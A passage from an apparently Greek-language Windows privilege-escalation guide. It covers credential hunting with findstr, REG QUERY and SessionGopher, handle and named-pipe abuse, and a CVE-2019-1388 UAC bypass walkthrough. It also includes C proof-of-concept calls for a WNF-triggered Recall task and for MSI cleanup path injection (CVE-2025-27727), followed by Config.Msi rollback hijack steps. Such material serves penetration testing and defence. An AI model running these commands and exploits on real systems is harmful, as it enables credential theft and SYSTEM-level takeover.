Για το Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιού και κρυπτογραφημένων στοιχείων σύνδεσης. Η παρουσία τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αρχεία αναγνώσιμα, αν υπάρχουν αποθηκευμένες καταχωρίσεις και αν το κλειδί προστατεύεται με Primary Password, πριν καταλήξετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα ανακτημένο διαπιστευτήριο ανήκει σε λογαριασμό τομέα, εξετάστε ξεχωριστά τα πραγματικά δικαιώματα ελέγχου ομάδων αυτού του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικών πρόσβασης LAPS](../active-directory-methodology/laps.md) της ομάδας· τα τεχνουργήματα του browser από μόνα τους δεν αποδεικνύουν ότι υπάρχει διαδρομή προς δικαιώματα διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **αναγνωρίζεται μέσω ενός class ID (CLSID)** και κάθε στοιχείο εκθέτει λειτουργικότητα μέσω μίας ή περισσότερων διεπαφών, οι οποίες αναγνωρίζονται μέσω interface IDs (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry, αντίστοιχα, στις θέσεις **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL**, καθώς και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό browser - COM DLL Overwriting: Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα προνόμιά σας**, αν το συγκεκριμένο DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση στα περιεχόμενα αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** στο σύστημα του θύματος.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτήν τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** για διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Διαρροή Handles

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια, η οποία κληρονομεί όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά προνόμια**, μπορείτε να αποκτήσετε το **ανοιχτό handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πιο ολοκληρωμένη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερα ανοιχτά handles διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που ονομάζονται **pipes**, επιτρέπουν την επικοινωνία και τη μεταφορά δεδομένων μεταξύ διεργασιών.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε προσφέρει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια**, υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, μπορείτε να συμβουλευτείτε τους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και προβολή όλων των pipes για τον εντοπισμό privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv), σε λειτουργία server, εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και έπειτα να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει αυθαίρετο DLL ως υπηρεσία. Πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή εγγράψιμου αρχείου → η υπηρεσία το ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και το χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει στο συγκεκριμένο handle το `InitContext` που ελέγχει ο επιτιθέμενος, από το `Initialize`. Καταχωρίστε μια εφαρμογή line με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε τα συμβάντα μέσω του `GetAsyncEvents` (`Req_Func 0`) και έπειτα καταργήστε την καταχώριση/τερματίστε τη λειτουργία, ώστε να επαναλάβετε τις ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, συνδεθείτε ξανά και καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL, ώστε να εκτελεστεί το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν ενέργειες στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση χειριστών πρωτοκόλλου / ShellExecute μέσω Markdown renderers

Οι clickable σύνδεσμοι Markdown που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο επιτιθέμενος ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για κωδικούς πρόσβασης**

Όταν αποκτάτε ένα shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη χαμηλών προνομίων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως «NT\AUTHORITY SYSTEM», ενώ είστε μη προνομιούχος χρήστης.

Αυτό επιτρέπει την κλιμάκωση προνομίων και την παράκαμψη του UAC ταυτόχρονα, με την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδόθηκε από τη Microsoft.

Μερικά από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να γίνει exploit αυτής της ευπάθειας, πρέπει να εκτελεστούν τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Medium σε High Integrity Level για Administrator / Παράκαμψη UAC

Διαβάστε αυτό για να **μάθετε σχετικά με τα επίπεδα ακεραιότητας**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τις παρακάμψεις του:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions καταλόγων μεταφόρτωσης προς κατάλογο που εξυπηρετείται από web server

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο μεταφόρτωσης, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχει ο καλών και στη συνέχεια να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction και να καταλήξει σε έναν κατάλογο που εξυπηρετείται από web server. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα της υπηρεσίας web, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Πρόκειται για όριο αυθαίρετης εγγραφής που εξαρτάται από την εκάστοτε εφαρμογή· ένας κατάλογος μεταφόρτωσης με δικαιώματα εγγραφής ή ένα ήδη υπάρχον junction από μόνο του δεν αρκεί για να το αποδείξει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στον χειριστή μεταφόρτωσης, τα πραγματικά δικαιώματα του χρήστη για διαγραφή/δημιουργία στον υποκατάλογο, τα πραγματικά ACL του προορισμού, αν η διεργασία εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας της διεργασίας εγγραφής και του web server. Η παθητική απογραφή μπορεί να εμφανίσει τα ACL των καταλόγων και τα μεταδεδομένα reparse, αλλά δεν μπορεί να αποδείξει τη συμπεριφορά του χειριστή ή μια μελλοντική αντικατάσταση με junction. Αν η εκτέλεση γίνεται με λογαριασμό υπηρεσίας, ελέγξτε το **πραγματικό token της διεργασίας** πριν εξετάσετε οποιαδήποτε ξεχωριστή διαδρομή αξιοποίησης προνομίων token.

## Εκκαθάριση προγραμματισμένης εργασίας με προνόμια, ενεργοποιούμενη από WNF

Μια προγραμματισμένη εργασία που δεν επιτρέπει τη μη αυτόματη εκτέλεση ενδέχεται να εκθέτει έναν μη προνομιούχο τρόπο ενεργοποίησης. Κατά τον έλεγχο μιας προνομιούχας εργασίας, εξαγάγετε το XML της και εξετάστε **όλους** τους triggers, καθώς και το DACL, τον principal και την ενέργειά της. Ειδικότερα, ένα `WnfStateChangeTrigger` προσδιορίζει μια κατάσταση Windows Notification Facility (WNF). Αν η συγκεκριμένη κατάσταση, η οποία υποστηρίζει δικαιώματα ασφαλείας, επιτρέπει στον τρέχοντα χρήστη να δημοσιεύσει μια ενημέρωση, ο χρήστης μπορεί να εκκινήσει έμμεσα την εργασία με την ταυτότητα που έχει ρυθμιστεί για αυτήν, παρά το `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Για παράδειγμα, η εργασία Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` εκτελούνταν ως SYSTEM, δεχόταν ενημερώσεις στην κατάσταση WNF `7508BCA32C079E41` από έναν τυπικό χρήστη και στη συνέχεια εξέταζε το `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, ακόμη κι όταν το Recall ήταν απενεργοποιημένο.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Για να ελέγξετε αν είναι προσβάσιμη, επιλύστε τη `ZwUpdateWnfStateData` από το `ntdll.dll`, υποβάλετε μια κενή ενημέρωση για το όνομα κατάστασης των οκτώ byte και συσχετίστε την κατάσταση επιστροφής με τα δεδομένα τελευταίας εκτέλεσης της εργασίας ή τη δραστηριότητα στο Procmon. Η παρακάτω απλοποιημένη δοκιμαστική κλήση χρησιμοποιεί την ακολουθία byte από το παράδειγμα της εργασίας Recall· αντικαταστήστε τα byte με εκείνα που εξήχθησαν για την εργασία που δοκιμάζετε.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Μετατροπή του recursive cleanup σε προνομιακή διαγραφή

Το χρήσιμο primitive δεν είναι μόνο το trigger, αλλά μια προνομιακή ρουτίνα cleanup που δέχεται έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο. Παρακολουθήστε τη λειτουργία από την απαρίθμηση έως την τελική τροποποίηση: η αναζήτηση προφίλ/συνεδριών, τα παιδιά που επιλέγονται μέσω wildcard, τα `SHCreateItemFromParsingName` και `IFileOperation::DeleteItem` αποτελούν ισχυρές ενδείξεις ότι μια διαδρομή που ελέγχθηκε προηγουμένως θα διασχιστεί αργότερα αναδρομικά. Αν οι απόγονοι δεν ανοίγονται σε σχέση με έμπιστα handles καταλόγων και δεν επικυρώνονται πριν από τη διαγραφή, ο επιτιθέμενος μπορεί να αλλάξει την ανάλυση της διαδρομής μεταξύ απαρίθμησης και χρήσης.<sup>[[43]](#references)</sup>

Συνδυάστε το WNF trigger με την [αντικατάσταση μέσω oplock, junction και Object Manager symlink](#from-folder-contents-delete-to-system-eop) που περιγράφεται παρακάτω: το oplock παγώνει το cleaner αφού επιλέξει το νόμιμο παιδί, ενώ ο εγγράψιμος πρόγονος αντικαθίσταται, ώστε η διαγραφή που συνεχίζει με προνόμια να επιλύσει τη διαδρομή μέσω του `\RPC Control` προς τον προστατευμένο στόχο. Στην αλυσίδα Recall, αυτό οδήγησε στη διαγραφή του `C:\Config.Msi` από το SYSTEM, η οποία απαιτείται για την τεκμηριωμένη τεχνική rollback του MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Οι εμφωλευμένοι απόγονοι παρακάμπτουν τις επιφανειακές διορθώσεις για reparse points

Η επικύρωση μόνο της ρίζας που ελέγχεται από τον επιτιθέμενο και του άμεσου παιδιού της δεν ασφαλίζει μια αναδρομική διαγραφή που βασίζεται σε διαδρομές. Διατηρήστε αυτά τα ελεγμένα αντικείμενα νόμιμα και μετακινήστε την αντικατάσταση junction/oplock σε ένα επιπλέον παιδί κάτω από αυτά· το `IFileOperation::DeleteItem` τελικά φτάνει στον μη επικυρωμένο απόγονο και ακολουθεί τον νέο προορισμό του. Το CVE-2026-20941 προέκυψε ακριβώς από αυτό το είδος ελλιπούς διόρθωσης, αφού η πρώτη ενημέρωση κώδικα Recall επικύρωσε το `UKP` και τον κατάλογο με μορφή GUID, αλλά διατήρησε την παλιά αναδρομική λειτουργία διαγραφής.<sup>[[43]](#references)</sup>

Η ασφαλής πρακτική είναι να ανοίγετε **κάθε απόγονο** σε σχέση με ένα ήδη έμπιστο handle καταλόγου, να λαμβάνετε και να επαληθεύετε την τελική επιλυμένη διαδρομή/το αντικείμενο και να εφαρμόζετε τη disposition διαγραφής στο επαληθευμένο handle. Μην επικυρώνετε ένα πρόθεμα και μετά επιστρέφετε σε αναδρομική διαγραφή βάσει διαδρομής. Κατά την εξέταση μιας ενημέρωσης κώδικα, ελέγξτε επίσης τις δομές στο πραγματικό σημείο κλήσης: σε αυτή την περίπτωση, η επιθεώρηση κατά τον χρόνο εκτέλεσης του `OBJECT_ATTRIBUTES` στο `NtCreateFile` έδειξε μη μηδενικό `RootDirectory` και σχετικό όνομα `{GUID}\\secure_file.lock`, καταρρίπτοντας την παραπλανητική έξοδο του decompiler που υποδείκνυε ένα δεύτερο primitive `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), ενώ ο exploit code είναι [**διαθέσιμος εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση βασίζεται στην κατάχρηση της λειτουργίας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο επιτιθέμενος πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`. Στη συνέχεια, ο Windows Installer θα χρησιμοποιήσει τον φάκελο για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων πακέτων MSI, αφού τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Έγχυση διαδρομής cleanup του Windows Installer COM (CVE-2025-27727)

Ένας χρήστης με χαμηλά προνόμια μπορεί να αποκτήσει πρόσβαση στην υπηρεσία SYSTEM `msiexec.exe` μέσω του αντικειμένου COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η αντίστροφη μηχανική εντόπισε τις σχετικές κλήσεις `IMsiServer` ως `MsiBeginTransactionW` στη μετατόπιση vtable `0xA0`, `SetEEUIDirectoryAndFilter` στη `0xC8` και `CleanupTempPackages` στη `0x50`. Αυτά τα ονόματα και οι μετατοπίσεις προέκυψαν από αντίστροφη μηχανική και μπορεί να διαφέρουν μεταξύ builds.<sup>[[41]](#references)</sup>

Για χρήστη που δεν είναι διαχειριστής, η `SetEEUIDirectoryAndFilter` κάνει impersonation του καλούντος μόνο κατά το άνοιγμα της παρεχόμενης διαδρομής με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` και `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο καλών μπορεί να διαγράψει τον κατάλογο και αποτρέπει την ακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο αντικείμενο αρχείου με το μετέπειτα cleanup ούτε αποδεικνύει ότι το δημιούργησε ο Windows Installer.<sup>[[41]](#references)</sup>

Μετά την `MsiBeginTransactionW`, η `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από το όρισμα filter του καλούντος. Η υπηρεσία γράφει μια επώνυμη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο καλών και τα δεδομένα `0x00000002` αποτελούν τη σημαία φακέλου. Η `CleanupTempPackages(NULL, FALSE)` ξεκινά έπειτα απευθείας το cleanup. Το ανυψωμένο worker της απαριθμεί τις τιμές μητρώου και περνά τις εγγραφές φακέλων στη recursive `FDeleteFolder` χωρίς να ελέγχει την προέλευση της διαδρομής. Αν η κανονική αφαίρεση αποτύχει, ο κώδικας καλεί επίσης την `LockdownPath`, διαγράφει τα χαρακτηριστικά του αρχείου και προσπαθεί ξανά.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι το path reuse και όχι το junction redirect. Καταχώρισε ένα `C:\Config.Msi` που δημιούργησες εσύ ως attacker, αφαίρεσέ το και άφησε το Windows Installer να δημιουργήσει αργότερα ξανά την ίδια διαδρομή με προστατευμένα rollback data. Το cleanup εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο κατάλογο ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο ασφαλείας των `FILE_FLAG_OPEN_REPARSE_POINT` και της μετρίασης redirection-trust, επειδή δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το deletion primitive ταιριάζει στην παρακάτω rollback chain: διατήρησε την ξεχωριστή εγγραφή `Installer\Folders`, διέγραψε το προστατευμένο `C:\Config.Msi`, δημιούργησέ το ξανά με NULL DACL και κράτησε ένα handle με δικαίωμα `WRITE_DAC` πριν το installer ενισχύσει το DACL. Το handle που άνοιξες εκ των προτέρων μπορεί να επαναφέρει ένα permissive DACL με `NtSetSecurityObject`, ώστε να αντικατασταθεί το παραγόμενο `.rbs` πριν συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το path, εμποδίζοντας την `CMsiTransaction::SetEEUIDirectoryAndFilter` να καλεί την `ScheduleFileOrFolderDelete` όταν είναι ενεργοποιημένο το νέο feature gate. Η κλήση COM μπορεί ακόμη να επιστρέφει success, αλλά δεν προσθέτει πλέον το path που ελέγχει ο attacker στο `TempPackages`. Εγκαταστήστε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025 αντί να χρησιμοποιείτε την επιτυχή επιστροφή της μεθόδου ως έλεγχο για το αν εφαρμόστηκε το patch.<sup>[[41]](#references)[[42]](#references)</sup>

Η τεχνική συνοψίζεται ως εξής:

1. **Stage 1 – Προετοιμασία για το Hijack (άφησε το `C:\Config.Msi` κενό)**

- Step 1: Εγκατάσταση του MSI
    - Δημιούργησε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
    - Δήλωσε το installer ως **"UAC Compliant"**, ώστε να μπορεί να το εκτελέσει ένας **μη-admin χρήστης**.
    - Κράτησε ανοιχτό ένα **handle** στο αρχείο μετά την εγκατάσταση.

- Step 2: Έναρξη του Uninstall
    - Κάνε uninstall το ίδιο `.msi`.
    - Η διαδικασία uninstall αρχίζει να μεταφέρει αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
    - **Κάνε poll στο ανοιχτό file handle** με το `GetFinalPathNameByHandle` για να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
    - Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
        - Σηματοδοτεί πότε έχει γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** ένα άλλο event προτού συνεχίσει το uninstall.

- Step 4: Αποτροπή διαγραφής του `.rbf`
    - Όταν λάβεις το σήμα, **άνοιξε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
    - Έπειτα **στείλε σήμα πίσω** ώστε να ολοκληρωθεί το uninstall.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **δεν αφαιρείται το `C:\Config.Msi`**.

- Step 5: Χειροκίνητη διαγραφή του `.rbf`
    - Εσύ (ο attacker) διαγράφεις χειροκίνητα το αρχείο `.rbf`.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για hijack.

